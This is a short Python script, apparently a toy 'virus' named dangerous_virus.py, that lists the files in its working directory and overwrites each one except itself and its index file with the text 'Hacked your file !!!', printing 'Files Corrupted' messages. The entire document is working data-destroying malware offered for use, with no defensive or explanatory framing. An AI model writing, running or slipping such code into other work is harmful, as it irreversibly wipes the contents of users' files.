import subprocess
import re
subprocess.run("ls --format=single-column >index.dat",shell = True)
fp = open("index.dat","r")
mydestroyList = fp.read()
mydestroyList = re.split("\\n",mydestroyList)
mydestroyList.remove("index.dat")
mydestroyList.remove("dangerous_virus.py")
fp.close()

for filek in mydestroyList:
	if filek != "dangerous.py" and filek != "index.dat":
		try:
			fpp = open(filek,"w")
			fpp.write("Hacked your file !!!")
			fpp.close()
		except FileNotFoundError:
  			print("!@#$%^&^%$#@#$%^%$# \nFiles Corrupted !!!!")
		except:
  			print("Files Corrupted !!!!")
		
		

